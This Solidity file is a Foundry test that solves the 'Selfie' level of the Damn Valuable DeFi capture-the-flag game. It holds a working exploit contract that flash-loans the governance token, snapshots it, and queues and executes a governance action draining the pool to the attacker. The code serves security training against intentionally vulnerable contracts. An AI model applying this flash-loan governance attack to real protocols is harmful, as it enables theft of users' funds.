// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         *      Steal all 1.5mln DVT, I have no tokens.
         *      Probably some governance manipulation is needed.
         *
         *      Could I flashloan Governance Tokens, execute drain all funds and return them back?
         *      Not really, `token` is set in the constructor
         *      Apparently `token` is actually THE DVT token, so it's the governance token.
         *
         *      How to pass onlyGovernance modifier? => call queueAction from SimpleGovernance with function
         *      signature drainAllFunds(address) as data. Then call executeAction with actionId after 2 days.
         *      call attack with borrowAmount = 1.5mln
         *      automatic call to receiveTokens
         *      warp 2 days
         *      call executeAction with actionId
         */
        vm.startPrank(attacker);
        Hack hack = new Hack(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));

        hack.attack(TOKENS_IN_POOL);

        vm.warp(3 days);
        simpleGovernance.executeAction(1);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Hack {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot dvt;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    uint256 actionId;
    address immutable i_owner;

    constructor(address poolAddress, address governanceAddress, address dvtSnapshotAddress) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        dvtSnapshot = DamnValuableTokenSnapshot(dvtSnapshotAddress);
        i_owner = msg.sender;
    }

    function attack(uint256 borrowAmount) external {
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address token, uint256 borrowAmount) external {
        dvtSnapshot.snapshot();
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", i_owner), 0);

        dvtSnapshot.transfer(address(pool), borrowAmount);
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}
